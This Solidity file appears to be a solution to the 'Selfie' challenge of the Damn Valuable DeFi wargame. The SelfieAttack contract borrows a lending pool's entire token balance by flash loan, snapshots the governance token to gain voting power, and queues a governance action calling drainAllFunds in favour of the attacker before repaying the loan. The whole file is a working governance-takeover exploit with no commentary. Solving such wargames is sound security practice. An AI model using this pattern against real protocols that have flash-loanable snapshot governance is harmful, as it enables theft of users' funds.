/// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISelfieLenderPool {
    function flashLoan(uint256 borrowAmount) external;

    function token() external view returns (address);
}

interface IDamnValuableTokenSnapshot is IERC20 {
    function snapshot() external returns (uint256);
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

contract SelfieAttack {
    uint256 public actionId;
    ISimpleGovernance governance;

    function attack(
        address selfieLendingPoolAddress,
        address simpleGovernanceAddress
    ) external {
        ISelfieLenderPool lendingPool = ISelfieLenderPool(
            selfieLendingPoolAddress
        );
        governance = ISimpleGovernance(simpleGovernanceAddress);
        uint256 tokenBalanceInPool = IDamnValuableTokenSnapshot(
            lendingPool.token()
        ).balanceOf(address(lendingPool));
        lendingPool.flashLoan(tokenBalanceInPool);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        address lendingPoolAddress = msg.sender;
        address attacker = tx.origin;
        IDamnValuableTokenSnapshot token = IDamnValuableTokenSnapshot(
            tokenAddress
        );
        token.snapshot();
        bytes memory call = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attacker
        );
        actionId = governance.queueAction(lendingPoolAddress, call, 0);
        token.transfer(lendingPoolAddress, amount);
    }
}
